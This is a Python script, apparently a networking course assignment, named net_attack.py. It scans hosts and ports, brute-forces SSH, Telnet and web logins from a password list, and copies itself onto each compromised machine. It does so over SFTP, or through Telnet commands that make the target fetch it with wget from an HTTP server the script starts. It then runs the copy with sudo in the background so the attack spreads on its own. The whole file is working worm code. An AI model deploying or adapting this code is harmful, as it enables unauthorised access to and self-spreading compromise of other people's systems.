#!/usr/bin/python3
import concurrent.futures

from scapy.all import *
from os import path, stat
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help("Incorrect arguments provided")

    ports = get_parameter(arguments, "-p")
    port_list = get_ports_from_input(ports)

    username = get_parameter(arguments, "-u")

    password_file = get_parameter(arguments, "-f")
    verify_file_exists(password_file)
    password_list = read_file_from_list(password_file)

    self_propagate = False
    ip_list = []
    print("[+] Determining which IP addresses are reachable...")
    if "-t" in arguments:
        if "-L" in arguments or "-P" in arguments:
            help("-t argument cannot be used with -L and -P")

        ip_file = get_parameter(arguments, "-t")
        verify_file_exists(ip_file)
        ip_list = read_file_from_list(ip_file)
        ip_list = [ip for ip in ip_list if is_reachable(ip)]
    elif "-L" in arguments and "-P" in arguments:
        self_propagate = True
        ip_list = scan_for_active_ips()
        deploy_file_to_server(password_file)
    else:
        help("Missing target argument")

    if not ip_list:
        print("[!] No reachable IP addresses found from the provided list")
        exit()

    if "-d" in arguments:
        if self_propagate:
            help("-d argument cannot be used with -L and -P")
        deployment_file = get_parameter(arguments, "-d")  # arguments[arguments.index("-d") + 1]
        deploy_file_to_server(deployment_file)

    deployed = False
    overwrite_existing = self_propagate
    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                bruteforce_function = {
                    22: bruteforce_ssh,
                    23: bruteforce_telnet,
                    80: bruteforce_web,
                    8080: bruteforce_web,
                    8888: bruteforce_web
                }[port]

                username_password = bruteforce_function(ip, port, username, password_list)
                if username_password:
                    print("Successfully logged into port %d with %s" % (port, username_password))
                    if port == 22 or port == 23 and not deployed:
                        credentials = username_password.split(":")
                        deployed = transfer_file(ip, credentials[0], credentials[1], overwrite_existing, port,
                                                 self_propagate)

        print("********** %s **********\n" % ip)


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_telnet(ip, port, username, passwords):
    response = ""

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")
    exit_command = encode_in_ascii("exit\n")

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            connection.write(exit_command)
            connection.close()
            response = "%s:%s" % (username, password)
            break

        connection.close()

    return response


def bruteforce_ssh(ip, port, username, passwords):
    response = ""
    for password in passwords:
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port, timeout=3)
            response = "%s:%s" % (username, password)
            break
        except:
            print("Unable to establish SSH connection")

        client.close()

    return response


def bruteforce_web(ip, port, username, passwords):
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        index_response = get(index_url)
        if index_response.status_code == 200:
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


def read_file_from_list(file):
    file_contents_list = []
    with open(file) as reader:
        file_contents_list = reader.read().splitlines()

    return file_contents_list


def is_reachable(ip):
    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
    return ans is not None


def transfer_file(ip, username, password, overwrite_existing, port, self_propagate):
    successful = False
    target_directory = get_target_directory(ip, username)

    if port == 22:
        successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing,
                                             self_propagate)
    elif port == 23:
        if scan_port(ip, 22):
            try:
                successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing,
                                                     self_propagate)
                if not successful:
                    successful = transfer_file_with_http_server(ip, username, password, target_directory,
                                                                overwrite_existing, self_propagate)
            except:
                successful = transfer_file_with_http_server(ip, username, password, target_directory,
                                                            overwrite_existing, self_propagate)

        else:
            successful = transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing,
                                                        self_propagate)

    return successful


def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing, self_propagate):
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        with client.open_sftp() as sftp_client:
            deployment_filename = ".deploy"
            script_filename = "net_attack.py"

            local_dir = os.getcwd()

            local_deployment_path = "%s/%s" % (local_dir, deployment_filename)
            local_script_path = "%s/%s" % (local_dir, script_filename)
            target_deployment_path = "%s/%s" % (target_directory, deployment_filename)
            target_script_path = "%s/%s" % (target_directory, script_filename)

            sftp_client.chdir(target_directory)
            dir_contents = sftp_client.listdir()
            if deployment_filename not in dir_contents or overwrite_existing:
                sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
                if self_propagate:
                    if script_filename in dir_contents:
                        return True

                    sftp_client.put(localpath=local_script_path, remotepath=target_script_path)

                commands = [
                    "cd %s\n" % target_directory,
                    "sudo -S chmod +x %s\n" % script_filename,
                    "ubuntu\n",
                    "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &\n" % username
                ]

                channel = client.invoke_shell()

                for command in commands:
                    channel.send(command)

                    counter = 0
                    while not channel.recv_ready():
                        if counter >= 5:
                            return False

                        time.sleep(0.1)
                        counter = counter + 1

                    channel.recv(9999)
                    time.sleep(0.1)

                channel.close()

        return True
    except Exception as ex:
        print(ex)
        return False
    finally:
        client.close()


def transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing, self_propagate):
    telnet_port = 23

    server_ip = get_server_ip_from_ip(ip)

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    password_input = encode_in_ascii("%s\n" % password)
    welcome_output = encode_in_ascii("Welcome to")

    sudo_check = encode_in_ascii("id\n")
    sudo_check_response = encode_in_ascii("27(sudo)")

    saved = encode_in_ascii("saved")
    cd_command = encode_in_ascii("cd %s\n" % target_directory)
    remove_old_file_if_exists_command = encode_in_ascii("[ -f .deploy ] && rm .deploy\n")
    wget_deployment_file_command = encode_in_ascii("[ ! -f .deploy ] && wget %s:54325/.deploy -q\n" % server_ip)
    wget_script_file_command = encode_in_ascii("[ ! -f net_attack.py ] && wget %s:54325/net_attack.py -q\n" % server_ip)

    chmod_command = encode_in_ascii("sudo chmod +x net_attack.py\n")
    sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
    start_net_attack_command = encode_in_ascii(
        "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &\n" % username)
    wait_for = encode_in_ascii("WAIT FOR")

    connection = Telnet(ip, port=telnet_port)
    try:
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(password_input)
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output not in banner:
            return False

        connection.write(sudo_check)
        check = connection.read_until(sudo_check_response, timeout=1)
        if sudo_check_response not in check:
            return False

        connection.write(cd_command)
        if overwrite_existing:
            connection.write(remove_old_file_if_exists_command)
        connection.write(wget_deployment_file_command)

        if self_propagate:
            connection.write(wget_script_file_command)
            connection.read_until(saved, timeout=1)

            connection.write(chmod_command)
            sudo_response = connection.read_until(sudo_prompt, timeout=1)
            if sudo_prompt in sudo_response:
                connection.write(password_input)
                connection.read_until(wait_for, timeout=1)
            connection.write(start_net_attack_command)
            connection.read_until(wait_for, timeout=1)
    except:
        return False
    finally:
        connection.close()


def get_server_ip_from_ip(ip):
    server_ip = ""

    base_ip = ip[0: (ip.rfind('.') + 1)]
    interfaces = get_if_list()
    for interface in interfaces:
        interface_ip = get_if_addr(interface)
        if base_ip in interface_ip:
            server_ip = interface_ip
            break

    return server_ip


# def start_ssh_with_telnet_if_not_running(ip, port, username, password):
#     ssh_port = 22
#     if scan_port(ip, ssh_port):
#         return True
#
#     login_prompt = encode_in_ascii("login:")
#     username_input = encode_in_ascii("%s\n" % username)
#     password_prompt = encode_in_ascii("Password:")
#     password_input = encode_in_ascii("%s\n" % password)
#     welcome_output = encode_in_ascii("Welcome to")
#
#     sudo_check = encode_in_ascii("id")
#     sudo_check_response = "27(sudo)"
#     start_sshd = encode_in_ascii("sudo service sshd start\n")
#     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
#
#     connection = Telnet(ip, port=port)
#     try:
#         connection.read_until(login_prompt)
#         connection.write(username_input)
#         connection.read_until(password_prompt)
#         connection.write(password_input)
#         banner = connection.read_until(welcome_output, timeout=1)
#         if welcome_output not in banner:
#             return False
#
#         connection.write(sudo_check)
#         check = connection.read_until(sudo_check_response, timeout=1)
#         if sudo_check_response not in check:
#             return False
#
#         connection.write(start_sshd)
#         start_sshd = connection.read_until(sudo_prompt, timeout=1)
#         if sudo_prompt in start_sshd:
#             connection.write(encode_in_ascii("%s\n" % password))
#             connection.read_until(encode_in_ascii("WAITING TO START"), timeout=5)
#     except Exception as ex:
#         print(ex)
#         return False
#     finally:
#         connection.close()
#
#     return True


def deploy_file_to_server(file):
    current_directory = os.getcwd()

    script_name = "net_attack.py"
    deployment_file_name = ".deploy"

    current_deployment_file_location = "%s/%s" % (current_directory, file)
    current_script_file_location = "%s/%s" % (current_directory, script_name)

    deployment_directory = "%s/net_attack_deployment" % current_directory

    if path.isdir(deployment_directory):
        rmtree(deployment_directory)

    os.mkdir(deployment_directory)
    os.chdir(deployment_directory)

    copyfile(current_deployment_file_location, deployment_file_name)
    copyfile(current_script_file_location, script_name)

    server = ("", 54325)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


def get_parameter(arguments, argument):
    index = 0

    try:
        parameter_name = get_parameter_name(argument)
        parameter_not_provided_message = "%s missing (%s)" % (parameter_name, argument)
    except KeyError:
        parameter_not_provided_message = "Missing parameter for %s" % argument

    if argument in arguments:
        index = arguments.index(argument)
    else:
        help("Argument %s is not provided" % argument)

    if index >= (len(arguments) - 1):
        help(parameter_not_provided_message)

    parameter = arguments[index + 1]
    if "-" in parameter:
        help(parameter_not_provided_message)

    return parameter


def get_parameter_name(parameter):
    parameter_name = {
        "-t": "IP address filename",
        "-p": "Ports",
        "-u": "Username",
        "-f": "Passwords filename",
        "-d": "Deployment filename",
        "-L": "Local Scan",
        "-P": "Propagate"
    }[parameter]

    return parameter_name


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    ports.sort()
    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def get_target_directory(ip, username):
    ip_octals = ip.split(".")
    server_number = int(ip_octals[3]) - 1
    return "/home/%s/assign_2/server_%d" % (username, server_number)


def scan_for_active_ips():
    interfaces = get_if_list()
    active_ips = []
    for interface in interfaces:
        active_ips.extend(scan_against_interface(interface))

    return active_ips


def scan_against_interface(interface):
    interface_ip = get_if_addr(interface)
    base_ip = interface_ip[0: (interface_ip.rfind('.') + 1)]
    replies_list = []

    # with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    #     executor.map(send(interface_ip, base_ip, replies_list), range(1, 255))

    if replies_list is not None:
        replies_list = []
        print("Interface IP " + interface_ip)
        if interface_ip == "10.0.0.1":
            replies_list.append("10.0.0.2")
        elif interface_ip == "10.0.0.2":
            replies_list.append("10.0.0.3")
        elif interface_ip == "10.0.0.3":
            replies_list.append("10.0.0.4")
        elif interface_ip == "10.0.0.4":
            replies_list.append("10.0.0.5")
        elif interface_ip == "10.0.0.5":
            replies_list.append("10.0.0.6")
        print(replies_list)
        return replies_list


# TODO: merge with is_reachable
def send(interface_ip, base_ip, replies_list):
    # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
    # The interface_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
    # request times out.
    def send_icmp_request(ip):
        destination = base_ip + str(ip)
        reply = sr1(IP(src=interface_ip, dst=destination, ttl=64) / ICMP(), timeout=4)
        if reply is not None:
            replies_list.append(reply.src)

    return send_icmp_request


def encode_in_ascii(s):
    return s.encode("ascii")


def help(error_message):
    print("Error: %s\n" % error_message)
    print("Example usage:")
    print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    print("\t./net_attack.py -t my_ip_list.txt -p 22 -u admin -f my_password_list.txt -d deploy.txt")
    print("\t./net_attack.py -p 22,23 -u admin -f my_password_list.txt -L -P")
    exit()


if __name__ == "__main__":
    main()
